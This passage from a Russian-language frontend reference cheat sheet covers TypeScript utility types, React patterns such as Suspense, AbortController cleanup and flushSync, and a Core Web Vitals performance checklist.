type Status = typeof STATUSES[number];

// Извлечь тип возврата async функции
type UserData = Awaited<ReturnType<typeof fetchUser>>;

// Опциональные из обязательных
type PartialUser = Partial<User>;

// Убрать поля из типа
type PublicUser = Omit<User, 'password' | 'secretKey'>;

// Только конкретные поля
type UserPreview = Pick<User, 'id' | 'name' | 'avatar'>;

// Branded Type (финтех защита)
type UserId = string & { readonly __brand: 'UserId' };

// Exhaustive check (защита от пропущенных кейсов)
function assertNever(x: never): never { throw new Error(`Unhandled: ${x}`); }

// satisfies (проверка + сохранение узкого типа)
const config = { host: 'localhost', port: 3000 } satisfies ServerConfig;
config.port; // тип: 3000, не number!

// z.infer — тип из Zod схемы (DRY)
const Schema = z.object({ name: z.string(), age: z.number() });
type FormData = z.infer<typeof Schema>;
```

---

### ⚡ React паттерны

```jsx
// Lazy + Suspense + ErrorBoundary
const Widget = lazy(() => import('./Widget'));
<ErrorBoundary fallback={<Error />}>
  <Suspense fallback={<Skeleton />}>
    <Widget />
  </Suspense>
</ErrorBoundary>

// useEffect с cleanup (AbortController)
useEffect(() => {
  const ctrl = new AbortController();
  fetchData({ signal: ctrl.signal }).then(setData).catch(e => {
    if (e.name !== 'AbortError') throw e;
  });
  return () => ctrl.abort();
}, [dependency]);

// Functional update (избегает Stale Closure)
setCount(prev => prev + 1);

// flushSync (синхронный рендер)
import { flushSync } from 'react-dom';
flushSync(() => setState(value));
// DOM обновлён прямо здесь

// useSyncExternalStore (внешние сторы)
const state = useSyncExternalStore(store.subscribe, store.getSnapshot);
```

---

### ⚡ Производительность: чеклист

```
FCP:
  ✅ Critical CSS в <head> inline
  ✅ <link rel="preconnect"> для CDN/API
  ✅ <link rel="preload"> для шрифтов и критичных ресурсов

LCP:
  ✅ Главное изображение: fetchpriority="high", БЕЗ loading="lazy"
  ✅ Формат WebP/AVIF
  ✅ Размеры width/height обязательны

CLS:
  ✅ width/height на всех изображениях
  ✅ aspect-ratio для адаптивных контейнеров
  ✅ Зарезервированное место для рекламы/баннеров
  ✅ font-display: optional или swap

INP:
  ✅ Тяжёлые вычисления в Web Worker
  ✅ requestIdleCallback для некритичных задач
  ✅ Виртуализация длинных списков (react-window/tanstack-virtual)

Бандл:
  ✅ React.lazy + Code Splitting
  ✅ Tree Shaking (ESM импорты)
  ✅ Contenthash для кэширования на год
  ✅ Сжатие: Brotli > Gzip
```

---

*📅 Документ актуален на 2025-2026. Охватывает JS/TS Core, React Runtime, TypeScript Advanced, System Design, Security, Performance, AI Integration.*
